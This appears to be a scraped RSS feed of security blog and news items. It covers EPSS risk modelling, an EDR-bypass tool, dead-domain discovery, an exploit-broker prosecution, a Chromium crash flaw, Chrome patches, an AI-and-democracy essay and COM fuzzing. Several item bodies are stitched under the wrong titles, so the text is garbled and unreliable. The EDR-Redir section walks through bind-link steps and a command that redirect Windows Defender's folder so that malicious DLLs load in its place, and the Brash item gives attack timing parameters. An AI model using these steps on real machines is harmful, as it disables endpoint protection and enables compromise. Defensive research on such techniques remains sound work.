Each CVE gets a likelihood value between 0 and 1 — the higher the score, the greater the chance of exploitation. (or Grouped EPSS) is the probability that  (1) vulnerability on a given asset will see exploitation activity in the next thirty (30) days. We calculate it using the classic “at least one” formula from probability theory. If each CVE  has probability EPSS, then the probability that none are exploited is the product of their non-exploitation probabilities (the inverse of the EPSS score). Subtracting from 1 gives us the probability of at least one CVE, which I call:This provides a baseline probability of exploitation for each asset — assuming no controls. It’s a “worst-case exposure” measure. So how do we factor in our security controls?Think of your organization’s defenses as layers of Swiss cheese. Each layer has some holes (no control is 100% effective), but multiple layers together can reduce the chance of an attacker slipping through all of them. This is the classic  of risk management. If the holes (control failures) don’t line up, the threat is stopped; only when all holes align does the bad outcome occur.This is where Bayesian inference enters the picture. Applying this to exploit likelihood means we can treat each control as a probabilistic filter that reduces the base exploitation likelihood from EPSS. To do this rigorously, we need a way to quantify how effective each layer is — and to update that belief over time.No model mirrors reality perfectly — but building a quantifiable starting point lets us iteratively align our assumptions with new evidence.Let’s dive into a few assumptions we need to establish.EPSS is representative of global exploitation pressure, a proxy for attacker behavior across the internetVulnerabilities with a CVE are not the only vulnerabilities in our software. EPSS covers only CVE-tagged vulnerabilities, a large but incomplete subset of all flaws. Still, it’s the only publicly available probabilistic dataset, making it the most practical foundation.Grouped EPSS (EPSS) is the public exploit pressure on this asset if it were on the public internet.Control Effectiveness rates assume that given the population of vulnerabilities, the control prevents exploitation % of the time. Controls are treated as independent layers — an assumption we can later test with telemetry.With those assumptions set, we can start quantifying how much each defensive slice of cheese actually helps.Modeling Control EffectivenessIn this context, I define control effectiveness as the probability that a given control prevents the exploitation of a vulnerability. Think of it as the defensive success rate for a specific layer.A network firewall might block 70% of exploit attempts.Assuming their effects are roughly independent, combined coverage could push actual likelihood well below the baseline.But how do we know those percentages?We usually don’t. Vendor claims are vague, telemetry can be incomplete, and empirical data is scarce. So we start with informed estimates — structured, measurable beliefs we can later update with data.One practical way to form our initial belief (the ) is to survey subject matter experts (SMEs) about control performance. Even if imperfect, this exercise builds a culture of quantitative reasoning and provides the starting point for Bayesian updating.That notion aside, we can construct a survey question using a scenario that accounts for our assumptions:Given an asset with 10 vulnerabilities present behind a well-configured firewall, how many does the firewall prevent the exploitation of?In this context, we can define well-configured as one that meets our internal standards (e.g., signatures current, traffic monitored, rule sets tuned).The answer options are integers between 0 and 10. Drawing on inspiration from How to Measure Anything in Cybersecurity Riskand , we ask twice: once for the median estimate (we directly ask our SMEs for an answer to the question and assume it’s the median value), and again for the 90th-percentile value — the number they’re 90% confident the true effectiveness is below.We then weight responses by self-rated expertise on a Likert scale (1 = novice, 5 = expert), producing both equal-weight and expertise-weighted models.Let’s say for demonstration purposes that we survey 12 SMEs. An example of those responses is below:In order to analyze this data, we turn to the Beta distribution. The Beta distribution is ideal for representing probabilities between 0 and 1 when we have uncertainty. The Beta distribution accepts two parameters:α (alpha) which is equal to the number of successes + 1β (beta) which is equal to failures + 1In simple terms, α and β shape the curve describing how confident we are about control success and failure rates.Our challenge is to infer α and β from SME p50 and p90 values. In Python, we can use  from  to reverse-engineer the Beta parameters that produce those percentiles.This function finds α and β whose cumulative distribution matches our SME-reported medians and 90th percentiles. By running this across all SME responses, we can build aggregate Beta distributions — both equally weighted and expertise-weighted versions — to visualize our shared belief about the control’s effectiveness and show the shape of our uncertainty.These distributions give us multiple values to pick for our central tendency single point value. In this scenario, I usually pick the lowest value in order to remain conservative with our judgments and overstate risk. Based on our example here, I would select a firewall control effectiveness rate for exploit prevention of 0.44, the expertise-weighted median value. The wide spread reminds us that uncertainty remains high until we gather more data.Updating our Beliefs: The Bayesian WayIntegrating Control Effectiveness with EPSSgOnce we have a control effectiveness rate, we can update our asset-level exploit likelihood by multiplying it by the inverse of our control effectiveness rate (our control failure rate).If an asset’s EPSS is 0.76 and our firewall effectiveness posterior mean is 0.44, then:That’s a 42% adjusted exploit likelihood — more realistic than assuming total exposure.Continuously Updating Control EffectivenessNow that we have our initial beliefs quantified, we can now update them with observations. Observation data can come in many forms, and for the firewall effectiveness example, we can likely look at our firewall logs to find exploit-related events. We could formulate a system that parses these logs and picks out the events that were successes and failures, depending on what type of logic an organization wants to implement.For our example here, let’s say we observe 15 successful exploit prevention events from our firewall logs, and 5 unsuccessful events in the next month. Using the reverse-engineered alpha and beta values from our expertise-weighted Beta distribution, we update our beliefs like so:Below is the resulting Beta distribution. The central tendency (our updated best estimate of control effectiveness) increased from 0.44 to 0.703, meaning we’ve gained confidence that the firewall blocks about 70.3% of exploit attempts. Our confidence interval also tightened.We can then turn around and make yet another update to our exploit likelihood on the asset (In practice, EPSS updates daily, so the asset’s baseline likelihood will shift as well.):From Static to Living ModelsThis process transforms our exploit likelihood model into a living system that evolves as evidence accumulates. Observation sources include:Firewall and EDR telemetry — blocked vs. successful exploit attemptsBreach and attack simulation tools like Red team or purple team exercisesIncident reports tied to control failuresAny feedback loop that distinguishes success from failure can feed the modelEach update shifts our posterior a little closer to reality. Over time, our understanding of “how holey our cheese really is” becomes quantifiable.A shared, continuously updated model lets all stakeholders align on reality and make smarter decisions about time, effort, and budget.In vulnerability management, our goal is to reduce exploit risk. By quantifying control effectiveness transparently, we strengthen trust in both the model and the decisions it supports.If you’re familiar with FAIR-CAM (Factor Analysis of Information Risk — Controls Analytics Model), you’ll recognize the conceptual overlap. FAIR-CAM formalizes how individual control functions combine to influence overall loss event frequency.I view what I outline here as  — a focused, quantitative slice of that same principle, applied specifically to exploit prevention. Instead of modeling every control family, we’re zooming in on how a single control’s effectiveness updates our belief in exploit likelihood through Bayesian inference. It’s a practical on-ramp for teams not yet ready for full FAIR-CAM implementation.The structure is identical in spirit: represents  (global exploit pressure). functions as  (how often the control stops that pressure). mirrors FAIR-CAM’s goal of adjusting control factors as evidence accumulates.In other words, this framework is an applied subset of FAIR-CAM — one that demonstrates how you can begin quantifying and updating control performance today, even before a full FAIR-CAM implementation.What I demonstrated here was the use of a single control’s effectiveness in reducing exploitation likelihood. However, organizations usually have multiple controls in place, and FAIR-CAM accounts for this. We can borrow that logic and apply it directly to this scenario by building additional control effectiveness models to update the exploit likelihood in succession:Exploit Vector Incident LikelihoodWhat if we could model the likelihood of an incident that includes exploitation within our environment? Where would we start, and how could we continuously update this model with observations? These questions point toward a vulnerability-to-incident pipeline, a frontier I am currently exploring.We can’t eliminate uncertainty — but we can measure it, update it, and communicate it.Bayesian updating gives us a disciplined way to evolve our beliefs as evidence accumulates. By pairing EPSS (our view of global exploit pressure) with quantified control effectiveness, we move from static assumptions to a dynamic, evidence-driven model.Each layer of Swiss cheese becomes a measurable probability curve — not just a metaphor, but a quantifiable defense system we can track, test, and improve.]]></content:encoded></item><item><title>Google confirms AI search will have ads, but they may look different</title><link>https://www.bleepingcomputer.com/news/google/google-confirms-ai-search-will-have-ads-but-they-may-look-different/</link><author>Mayank Parmar</author><category>security</category><pubDate>Sat, 1 Nov 2025 16:56:00 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Google Ads are not going anywhere.

  In previous articles, I demonstrated using Windows' bind link feature to block
  or redirect Antivirus/EDR from accessing their executable folder. You can
  review this article via the link:

  However, some EDRs provide good protection for their operating folders,
  resulting in failed bind link creation.

  This time, I will upgrade EDR-Redir to version V2. Of course, I will
  still use bind link technology, but in a completely different way.

  I will experiment with EDR-Redir V2 using Windows Defender on Windows 11. With
  this new approach, I'm quite confident it will work with many Antivirus/EDR
  solutions.
1. The Idea Behind Working With EDR-Redir V2
  When software is installed on Windows, it typically resides in a subfolder,
  such as , , ,
  and so on.

  Antivirus and EDR software are no exception; most of them are located in
  either  or . Windows Defender,
  however, is found in .

  Antivirus and EDRs, in order to protect their operating folders, typically
  prevent writing files there. However,
  they cannot stop file writing to their parent folder. For example, if
  they block writing to the  folder, they inadvertently
  prevent other software from being installed on the machine, which can cause
  significant inconvenience for users.
So why not think outside the box? Instead of creating a bind link to
  the EDR's folder, we could
  create a bind link to the Program Files folder, for example.

  When dealing with the Program Files folder, we encounter the issue of ensuring
  that other software, aside from the EDR, functions normally.
  The idea here is to create bind links so that a folder points back to
    itself.
  The steps to implement this idea are as follows (I will provide an example
  using the  folder):
Query all the folders within the Program Files folder.
    Create corresponding folders in a location you fully control
    ().
  
    Create bind links from the folders in Program Files that point to their
    corresponding folders in .
  
    Continue creating bind links from  that point to the
    corresponding folders in Program Files. This will create a loop, causing
    access to the folders in Program Files to circle back to themselves. Most
    importantly, we will not create a bind link for the EDR's folder at this
    stage.
  
    Create a bind link from Program Files to  to force the
    redirection of the EDR's folder through .
  
    At this point, you can perform DLL hijacking by dropping executable files
    that the EDR usually interacts with into , allowing you to
    leverage them to activate in place of the EDR.
  
  Once these steps are successfully completed, we may be able to effectively
  redirect even the most stubborn types of EDRs.

  2. Experimenting With EDR-Redir V2 Using Windows Defender
First, you can download  via the link below.Windows Defender on
  Windows 11 is located at C:\ProgramData\Microsoft\. Therefore, I will
  target this folder for the attack.
I will run  with the following parameters:
    EDR-Redir.exe C:\ProgramData\Microsoft c:\TMP\TEMPDIR
    "C:\ProgramData\Microsoft\Windows Defender"
   is the folder I need to redirect elsewhere.
 is the target folder. C:\ProgramData\Microsoft\Windows Defender is the exception folder; it
  will not have a link loop created to block
  Defender.

  During execution, EDR-Redir will print to the console information about which
  bind links will be created for easier monitoring. As shown in the results, I
  successfully redirected Windows Defender to C:\TMP\TEMPDIR.

  At this point, Windows Defender will always see the folder
   as the parent folder of its operating folder.

  Antivirus/EDR can only protect their operating folders; they cannot intervene
  in the parent folders of these directories. Once the parent folder is
  successfully attacked, the protection of the operating folders by the EDR
  becomes meaningless.

  When programming, many developers may not consider the possibility of a folder
  like Program Files being redirected. Therefore, I suspect that the list of
  EDRs affected by this technique will be quite extensive.
The defensive approach
  is to monitor the use of bind links with folders like Program Files to ensure
  they aren't tampered with by the hands of attackers.

Attackers can exploit these vulnerabilities by registering expired or unregistered domains that were previously owned by legitimate entities.

But: How can security researchers and penetration testers efficiently identify these dead domains?

Some time ago, I stumbled over Süleyman Çelikarslan’s (@slymn\_clkrsln) tweets about second order domain takeover vulnerabilities. This inspired me to create two tools that can help identify dead domains:

Both tools aim to assist security researchers and penetration testers in discovering expired or unregistered domains _on the fly_. After achieving good results with the Chrome extension, I noticed that the “right” place to catch dead domains would probably be at the DNS level. Hence, I developed the UDP DNS forwarder.

## Dead Domain Discovery - Chrome Extension

The Chromium extensions aims to identify abandoned domains that are referenced by a website for instance within an iFrame, as script or as CSS source. The extension adds a small content script to each visited page that scans for such references using a call to dns.google.com. If a domain appears to be unregistered or expired, a notification is shown to the user using Chrome’s notification API. The extension uses manifest version 3 and is open source.

The recommended path for installation is via the Chrome Web Store.

Alternatively, you can also install the extension manually by following the instructions in the GitHub repository.

## Dead Domain Discovery DNS - DNS Forwarder

The Dead Domain Discovery DNS tool is a lightweight UDP DNS forwarder that highlights potentially expired or unregistered domains by watching for unanswered lookups. The server retries queries against secondary upstream resolvers, keeps a cooldown window to avoid noisy alerts, and reports findings through multiple channels.

The tool is built in Python makes use of the dnslib library for DNS packet handling. It can be easily integrated into existing penetration testing setups or used as a standalone service. I use it as my primary DNS server in my home setup to catch dead domains while browsing the web or performing security assessments. It is leightweight and efficient, making it suitable for continuous monitoring. I would recommend to run it on a Raspberry Pi or similar low-power devices.

You can find the repository and installation instructions on GitHub.

The DoJ stated that these tools, valued at $35 million, were part of Trenchant’s sensitive research and were never intended for foreign sale. Williams sold them for at least $1.3 million in cryptocurrency, signing formal contracts with the Russian intermediary for the initial sale of the components as well as a promise to provide follow-on technical support. Williams used the illicit proceeds to purchase luxury items, according to court filings.Trenchant, L3Harris Technologies’ cyber capabilities arm, develops advanced offensive and defensive tools used by government agencies within the Five Eyes intelligence alliance. According to the DoJ, , giving various customers of the broker, including the Russian government and other foreign cyber threat actors, an edge in targeting U.S. citizens, businesses, and critical infrastructure.While the court reports did not name the broker, prior reporting suggests it may be Operation Zero, a Russian platform known for buying and reselling zero-day exploits, often rewarding developers with large cryptocurrency payouts.. As international cyber brokers expand in their roles as international arms dealers, law enforcement officials reaffirm their hard stance against malicious insiders abusing their positions of trust.The Bad | New “Brash” Flaw Crashes Chromium Browsers with Timed AttacksSecurity researcher . Pino has named the vulnerability “Brash” and attributes it to an architectural oversight that fails to rate-limit updates to the document.title API. Without the rate-limiting, an attacker can generate millions of document object model (DOM) mutations per second by repeatedly changing the page title, overwhelming the browser, and consuming CPU resources until the UI thread becomes unresponsive.The Brash exploit occurs in three phases. First, the attacker prepares a hash seed by loading 100 unique 512-character hexadecimal strings into memory to vary title updates and maximize the impact of the attack. Then, the attacker launches burst injections that perform three consecutive  updates in a row, which in default test settings inject roughly 24 million updates per second using a burst size of 8,000 and a 1 ms interval. Lastly, the sustained stream of updates saturates the browser’s main thread, forcing both the tab and the browser to hang or crash and requiring forced termination.. This increases the danger since attackers can control when the large-scale disruption will occur. Hypothetically, a single click on a specially crafted URL can detonate the attack with millisecond accuracy and little initial indication.The vulnerability affects Google Chrome and all Chromium-based browsers, including Microsoft Edge, Brave, Opera, Vivaldi, Arc, Dia, OpenAI ChatGPT Atlas, and Perplexity Comet. WebKit-based browsers such as Mozilla Firefox and Apple Safari are not vulnerable to Brash as well as any iOS third-party browsers.The Ugly | Hacktivists Manipulate Canadian Industrial Systems, Triggering Safety RisksThe Canadian Centre for Cyber Security has issued a warning that . The alert highlights rising malicious activity that targets internet-exposed Industrial Control Systems (ICS) and urges firms to shore up their security measures to prevent such attacks.The bulletin cites three recent incidents. In the first, a water treatment facility experienced tampering with water pressure controls, degrading service for the local community. Following that, a Canadian oil and gas company had its Automated Tank Gauge (ATG) manipulated, triggering false alarms. In a third breach, a grain drying silo on a farm had temperature and humidity settings altered, creating potentially unsafe conditions if the changes had gone undetected.Authorities believe these attacks were opportunistic rather than being technically sophisticated, and intended to attract media attention, underme public trust, and harm the reputation of Canadian authorities. .Although none of the targeted facilities suffered damage, the incidents underline inherent risks in poorly protected ICS, including programmable logic controllers (PLCs), supervisory control and data acquisition (SCADA) systems, human-machine interfaces (HMIs), and industrial IoT devices.The Cyber Centre recommends that organizations inventory and secure internet-accessible ICS devices, remove direct internet exposure where possible, implement VPNs with multi-factor authentication (MFA), maintain regular firmware updates, and conduct regular penetration testing. Resources like the Cyber Security Readiness Goals (CRGs) can offer guidance for critical infrastructure firms and officials remind organizations that suspicious activity should be reported via My Cyber Portal or to local authorities to reduce risks of future compromise.]]></content:encoded></item><item><title>Update Chrome now: 20 security fixes just landed</title><link>https://www.malwarebytes.com/blog/news/2025/10/update-chrome-now-20-security-fixes-just-landed</link><author></author><category>threatintel</category><pubDate>Fri, 31 Oct 2025 11:33:48 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[Google has released an update for its Chrome browser that includes 20 security fixes, several of which are classed as high severity. Most of these flaws were found in Chrome’s V8 engine—the part of Chrome (and other Chromium-based browsers) that runs JavaScript. Chrome is by far the world’s most popular browser, used by an estimated 3.4 billion people. That scale means when Chrome has a security flaw, billions of users are potentially exposed until they update.These vulnerabilities are serious because they affect the code that runs almost every website you visit. Every time you load a page, your browser executes JavaScript from all sorts of sources, whether you notice it or not. Without proper safety checks, attackers can sneak in malicious instructions that your browser then runs—sometimes without you clicking anything. That could lead to stolen data, malware infections, or even a full system compromise.That’s why it’s important to install these patches promptly. Staying unpatched means you could be open to an attack just by browsing the web, and attackers often exploit these kinds of flaws before most users have a chance to update. Always let your browser update itself, and don’t delay restarting to apply security patches, because updates often fix exactly this kind of risk.The Chrome update brings the version number to 142.0.7444.59/.60 for Windows, 142.0.7444.60 for MacOS and 142.0.7444.59 for Linux. So, if your Chrome is on the version number  it’s protected from these vulnerabilities.The easiest way to update is to allow Chrome to update automatically, but you can end up lagging behind if you never close your browser or if something goes wrong—such as an extension stopping you from updating the browser.To update manually, click the “” menu (three stacked dots), then choose  > . If there is an update available, Chrome will notify you and start downloading it. Then relaunch Chrome to complete the update, and you’ll be protected against these vulnerabilities. Among the vulnerabilities in the V8 engine there are two that stand out:is a high-severity “type confusion” vulnerability in the V8 JavaScript engine.  This happens when code doesn’t verify the object type it’s handling and then uses it incorrectly. In other words, the software mistakes one type of data for another—like treating a list as a single value or a number as text. This can cause Chrome to behave unpredictably and, in some cases, let attackers manipulate memory and execute code remotely through crafted JavaScript on a malicious or compromised website. Google paid a $50,000 bounty for its discovery, highlighting its severity. involves an inappropriate implementation in V8 and is classified as critical. This one allows remote code execution (RCE)—meaning an attacker could run code on your computer just by getting you to visit a specially crafted page. Google’s Big Sleep project, an AI-driven system that automates vulnerability discovery, found the flaw. It stems from improper handling in the internals of the JavaScript and WebAssembly engines and carries a high risk of data theft, malware installation, or even full system compromise.Users of other Chromium-based browsers—like Edge, Opera, and Brave—can expect similar updates in the near future.We don’t just report on threats—we remove them]]></content:encoded></item><item><title>The MSP Cybersecurity Readiness Guide: Turning Security into Growth</title><link>https://thehackernews.com/2025/10/the-msp-cybersecurity-readiness-guide.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgqekRxhqSIMwXW-91BTf99RLxdfwXB5-1vhEwnAeSX55XbaEU2fhjyDONSC1rnBDBMseaqYwmBpe4nYpyDlg7m9cmg5u-934M1hZSWzihqR7Ll0acZ7jqLUcL6m9S8h-KZPMqLDyC5x3kTr4rZ3q6uUA7Lt4nWYlwr3ddJnK4AofUxhkKVl4PI0CJXoI8/s1600/TurnSecurityIntoGrowth.png" length="" type=""/><pubDate>Fri, 31 Oct 2025 11:30:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[MSPs are facing rising client expectations for strong cybersecurity and compliance outcomes, while threats grow more complex and regulatory demands evolve.

Sanders share five key insights from their new book, Rewiring Democracy: How AI Will Transform Our Politics, Government, and Citizenship.AI can be used both for and against the public interest within democracies. It is already being used in the governing of nations around the world, and there is no escaping its continued use in the future by leaders, policy makers, and legal enforcers. How we wire AI into democracy today will determine if it becomes a tool of oppression or empowerment.1. AI’s global democratic impact is already profound.It’s been just a few years since ChatGPT stormed into view and AI’s influence has already permeated every democratic process in governments around the world:In 2022, an artist collective in Denmark founded the world’s first political party committed to an AI-generated policy platform.Also in 2022, South Korean politicians running for the presidency were the first to use AI avatars to communicate with voters en masse.In 2023, a Brazilian municipal legislator passed the first enacted law written by AI.In 2024, a U.S. federal court judge started using AI to interpret the plain meaning of words in U.S. law.Also in 2024, the Biden administration disclosed more than two thousand discrete use cases for AI across the agencies of the U.S. federal government.The examples illustrate the diverse uses of AI across citizenship, politics, legislation, the judiciary, and executive administration.Not all of these uses will create lasting change. Some of these will be one-offs. Some are inherently small in scale. Some were publicity stunts. But each use case speaks to a shifting balance of supply and demand that AI will increasingly mediate.Legislators need assistance drafting bills and have limited staff resources, especially at the local and state level. Historically, they have looked to lobbyists and interest groups for help. Increasingly, it’s just as easy for them to use an AI tool.2. The first places AI will be used are where there is the least public oversight.Many of the use cases for AI in governance and politics have vocal objectors. Some make us uncomfortable, especially in the hands of authoritarians or ideological extremists.In some cases, politics will be a regulating force to prevent dangerous uses of AI. Massachusetts has banned the use of AI face recognition in law enforcement because of real concerns voiced by the public about their tendency to encode systems of racial bias.Some of the uses we think might be most impactful are unlikely to be adopted fast because of legitimate concern about their potential to make mistakes, introduce bias, or subvert human agency. AIs could be assistive tools for citizens, acting as their voting proxies to help us weigh in on larger numbers of more complex ballot initiatives, but we know that many will object to anything that verges on AIs being given a vote.But AI will continue to be rapidly adopted in some aspects of democracy, regardless of how the public feels. People within democracies, even those in government jobs, often have great independence. They don’t have to ask anyone if it’s ok to use AI, and they will use it if they see that it benefits them. The Brazilian city councilor who used AI to draft a bill did not ask for anyone’s permission. The U.S. federal judge who used AI to help him interpret law did not have to check with anyone first. And the Trump administration seems to be using AI for everything from drafting tariff policies to writing public health reports—with some obvious drawbacks.It’s likely that even the thousands of disclosed AI uses in government are only the tip of the iceberg. These are just the applications that governments have seen fit to share; the ones they think are the best vetted, most likely to persist, or maybe the least controversial to disclose.3. Elites and authoritarians will use AI to concentrate power.Many Westerners point to China as a cautionary tale of how AI could empower autocracy, but the reality is that AI provides structural advantages to entrenched power in democratic governments, too. The nature of automation is that it gives those at the top of a power structure more control over the actions taken at its lower levels.It’s famously hard for newly elected leaders to exert their will over the many layers of human bureaucracies. The civil service is large, unwieldy, and messy. But it’s trivial for an executive to change the parameters and instructions of an AI model being used to automate the systems of government.The dynamic of AI effectuating concentration of power extends beyond government agencies. Over the past five years, Ohio has undertaken a project to do a wholesale revision of its administrative code using AI. The leaders of that project framed it in terms of efficiency and good governance: deleting millions of words of outdated, unnecessary, or redundant language. The same technology could be applied to advance more ideological ends, like purging all statutory language that places burdens on business, neglects to hold businesses accountable, protects some class of people, or fails to protect others.Whether you like or despise automating the enactment of those policies will depend on whether you stand with or are opposed to those in power, and that’s the point. AI gives any faction with power the potential to exert more control over the levers of government.4. Organizers will find ways to use AI to distribute power instead.We don’t have to resign ourselves to a world where AI makes the rich richer and the elite more powerful. This is a technology that can also be wielded by outsiders to help level the playing field.In politics, AI gives upstart and local candidates access to skills and the ability to do work on a scale that used to only be available to well-funded campaigns. In the 2024 cycle, Congressional candidates running against incumbents like Glenn Cook in Georgia and Shamaine Daniels in Pennsylvania used AI to help themselves be everywhere all at once. They used AI to make personalized robocalls to voters, write frequent blog posts, and even generate podcasts in the candidate’s voice. In Japan, a candidate for Governor of Tokyo used an AI avatar to respond to more than eight thousand online questions from voters.Outside of public politics, labor organizers are also leveraging AI to build power. The Worker’s Lab is a U.S. nonprofit developing assistive technologies for labor unions, like AI-enabled apps that help service workers report workplace safety violations. The 2023 Writers’ Guild of America strike serves as a blueprint for organizers. They won concessions from Hollywood studios that protect their members against being displaced by AI while also winning them guarantees for being able to use AI as assistive tools to their own benefit.5. The ultimate democratic impact of AI depends on us.If you are excited about AI and see the potential for it to make life, and maybe even democracy, better around the world, recognize that there are a lot of people who don’t feel the same way.If you are disturbed about the ways you see AI being used and worried about the future that leads to, recognize that the trajectory we’re on now is not the only one available.The technology of AI itself does not pose an inherent threat to citizens, workers, and the public interest. Like other democratic technologies—voting processes, legislative districts, judicial review—its impacts will depend on how it’s developed, who controls it, and how it’s used.Constituents of democracies should do four things: the technology ecosystem to be more trustworthy, so that AI is developed with more transparency, more guardrails around exploitative use of data, and public oversight. inappropriate uses of AI in government and politics, like facial recognition technologies that automate surveillance and encode inequity. AI in government where it can help improve outcomes, like making government more accessible to people through translation and speeding up administrative decision processes. the systems of government vulnerable to the disruptive potential of AI’s superhuman capabilities, like political advertising rules that never anticipated deepfakes.These four Rs are how we can rewire our democracy in a way that applies AI to truly benefit the public interest.EDITED TO ADD (11/6): This essay was republished by Fast Company.]]></content:encoded></item><item><title>When AI Agents Go Rogue: Agent Session Smuggling Attack in A2A Systems</title><link>https://unit42.paloaltonetworks.com/agent-session-smuggling-in-agent2agent-systems/</link><author>Jay Chen and Royce Lu</author><category>threatintel</category><enclosure url="https://unit42.paloaltonetworks.com/wp-content/uploads/2025/10/04_Tutorial_Category_1920x900.jpg" length="" type=""/><pubDate>Fri, 31 Oct 2025 10:00:33 +0000</pubDate><source url="https://unit42.paloaltonetworks.com/">Unit 42</source><content:encoded><![CDATA[Agent session smuggling is a novel technique where AI agent-to-agent communication is misused.

In the past, COM has been a target for many purposes. Not only have many vulnerabilities been discovered in COM, but it is also used for lateral movement or bypassing techniques.Because of this, many (security) research is already conducted in this area. So to look for new vulnerabilities or techniques, another approach would probably lead to better results (vulnerabilities). I couldn’t find any tooling/blogs related to fuzzing COM/DCOM, but correct me if I’m wrong. As fuzzing MS-RPC was proven to be a successful approach to discovering new vulnerabilities, I wondered if the same concept could be applied to COM/DCOM.I decided to write a fuzzer around the OleViewDotNet tool from James Forshaw. The tool is mainly known for it’s GUI (Graphical User Interface). However, it’s power really comes with working with the command line options, more on this topic later.This white paper describes how COM/DCOM works and what complications it has. In the next chapters, the white paper will describe how security research can be automated using the fuzzing approach. Since this approach comes with some problems, it describes how these problems were overcome (at least partially).The white paper continues to describe what capabilities the COM fuzzer has and discusses some examples. Finally, the white paper will share some results and discuss how the fuzzer can be improved.Essentially, COM solves a problem for developers. In the early days of Windows, software developers faced a major interoperability. Different applications were written in different languages (C, C++, Visual Basic, etc.). There was no standard way for programs or components to talk to each other or reuse code across applications. Developers often had to recompile or rewrite code just to use it in another program.COM (Component Object Model) is Microsoft’s technology for building binary software components that can interact with each other, regardless of the programming language they were created in.graph TD

COM has a few core ideas that are necessary to get familiar with to understand how COM works. The first one are interfaces.A COM object exposes functionality through interfaces. Each interface is identified by a GUID (Globally Unique Identifier). COM Clients don’t care how the object is implemented since they just call methods via its interface. The interface ensures that the client and server communicate using the same rules. It uses the Interface Definition Language (IDL) to create an interface. Consider the following example interface:All COM interfaces inherit from a fundamental base interface called , which defines three methods:The  gets pointers to other interfaces and ,  manage the object’s lifetime.A COM Class is the actual implementation of one or more interfaces, and it is the blueprint for creating a COM object. It defines the functionality (methods and properties) available in the COM component. Every COM Class is uniquely identified by a Class ID (CLSID), which is a Globally Unique Identifier (GUID).A client application uses the CLSID to ask the COM runtime (via functions like ) to instantiate an object of that specific class. CLSIDs are registered under the  key in the Windows Registry, pointing to the location of the actual component (DLL or EXE).1

The ProgID (Programmatic Identifier) is a user-friendly, human-readable string that serves as an alias for a COM Class’s CLSID. It provides an easy-to-use name for creating a COM object, often used in scripting languages like VBScript’s . ProgID’s typically follows the pattern: <Program>.<Component>.<Version>. Example: .There are also version-independent ProgID’s that omit the version, example: . ProgIDs are registered under , and each ProgID key contains a subkey that maps it back to its corresponding CLSID.The AppID is a GUID that uniquely identifies a COM server (the executable or DLL that hosts one or more COM Classes) for configuration purposes. Essentially, it’s an identifier that groups multiple related COM classes.DCOM builds upon the core COM architecture by adding a network protocol layer, making remote object access feel like local access. DCOM primarily uses Remote Procedure Call (RPC) over network protocols like TCP/IP to facilitate communication between the client process and the object’s server process, which are on separate machines.Proxies and stubs are used to enable a client on one machine to call a method on an object on another machine. A Proxy object is created on the client machine. The client calls methods on this local proxy object. The proxy packages the method call arguments, sends them across the network using RPC (marshalling), and waits for a response.The client requests the object’s creation using the CLSID or ProgID. The local COM Service Control Manager (SCM) contacts the SCM on the remote machine to locate, authenticate, and launch the COM server process (EXE), which then creates the object.graph TD

When a COM class is defined, it represents a blueprint for creating COM objects. When a client application wants to use a COM object, it calls a function like , passing in the CLSID of the class and the interface it needs. This call is handled by the Service Control Manager (SCM), the COM service responsible for locating and activating the appropriate component.The SCM checks the registry to determine whether the COM server is local or remote, and whether it runs as a DLL or an executable. If it’s a DLL, the SCM loads it directly into the client’s process. If it’s an EXE, it starts the executable (if not already running) and establishes communication with it.sequenceDiagram

Working with COM classes using the registry is quite inconvenient. This is where the tool OleViewDotNet comes in. This is a .net OLE/COM viewer and inspector to merge functionality of OleView.It allows you to find COM objects through a number of different views (e.g., by CLSID, by ProgID, by server executable), enumerate interfaces on the object and then create an instance and invoke methods. It also has a basic container to attack ActiveX objects to so you can see the display output while manipulating the data.The tool comes with a GUI that most people use when researching COM. However, the cmdlets accessible from PowerShell provide far more flexibility from a researching perspective.Most of the cmdlets of OleViewDotNet parse a COM database that contains a set of classes. These classes can be gathered using :1

Here we get the first 10 COM classes that  gathered. Now it’s going to get annoying if every time you want to look at some COM information you need to run the lengthy Get-ComDatabase command. That’s why a simple save and reload feature was implemented. Running the following command will write the current database out to the default database location:This is where things get more complicated, but it also is the reason the newer features of OleViewDotNet make a solid base for a fuzzer. In order to actually invoke COM procedures, we need a COM client to do so.As explained by James Forshaw: The NdrProxyInitialize function can be used to obtain the COM interface from its  structure by passing in the interface pointer to a proxy. Although this approach is not as flexible as a fully custom implementation, it provides a straightforward way to manage the transport layer without concern for platform or protocol differences. It can also operate with an existing COM object by querying the appropriate interface, extracting the buffer, and making calls to the remote server.In order to create a COM client for an interface, we first create a new COM object from a CLSID and gather its interface ID’s using:1

IDispatch is a fundamental COM interface, that allows scripting languages (VB, PowerShell) and higher-level languages (.NET) to interact with COM objects that implement it without prior knowledge. It achieves this by exposing unified methods that describe and interact with the implementing object.  maps names of methods or properties to an integer value named DISPID.Our above example included the IDispatch interface:This is the reason our COM client was able to map the name of the methods/procedures, like . But not every COM class/object includes this interface. Proxies lose name information when compiled from MIDL to their C marshaled representation. Therefore, OleViewDotNet just generates placeholder names, for example, method names are of the form .1

If the proxy is for a type that has a known definition, such as from a Windows Runtime type or a type library, then OleViewDotNet will try and automatically apply the names. While losing the procedure name context is a bummer, it still allows invoking the procedure and A LOT of classes do not support the IDispatch interface, which means that skipping them would reveal far less interesting results.With the previous chapters in mind and the power of OleViewDotNet, there lies an obvious solution to automating vulnerability research for COM; we loop over all classes it’s interfaces, create a COM client for it and invoke the procedures it holds. We feed the input parameters with randomized values and observe the result; fuzzing.The fuzzing approach by general looks as follows:flowchart TD

